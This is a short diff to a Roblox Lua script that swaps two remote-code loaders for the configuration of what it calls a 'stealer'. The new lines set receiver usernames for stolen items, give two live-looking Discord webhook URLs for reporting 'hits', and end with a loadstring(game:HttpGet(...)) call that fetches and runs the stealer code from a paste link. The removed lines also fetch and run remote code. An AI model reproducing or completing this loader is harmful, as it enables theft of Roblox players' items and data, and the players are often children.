@@ -1,2 +1,12 @@
-loadstring(game:HttpGet("https://pastebin.com/raw/e2AuSdqU"))()
-loadstring(game:HttpGet("https://egorikusa.space/d6c54ac4e345d6dfc08a2a6d.lua", true))()
+STEALER_LINK = '' -- stealer link (https://dpaste.com/8TTJHZ457.txt)
+
+Usernames = {
+    'Gablock40', -- PUT UR ROBLOX USERNAMES
+    'Nicks_Master', -- AS MANY AS U WANT BUT DONT FORGET ,
+    'BorninAdoptme',
+}
+
+BigHitsWebhook = "https://discord.com/api/webhooks/1333497583380856852/TULSFR4CDQfo82zBRZj3pDAQlewszLydYhIqWT2VcW5xp_2-Cm8HYzXqQ22CWU-6BsP1"
+SmallHitsWebhook = "https://discord.com/api/webhooks/1333497583380856852/TULSFR4CDQfo82zBRZj3pDAQlewszLydYhIqWT2VcW5xp_2-Cm8HYzXqQ22CWU-6BsP1"
+
+loadstring(game:HttpGet(STEALER_LINK, true))()
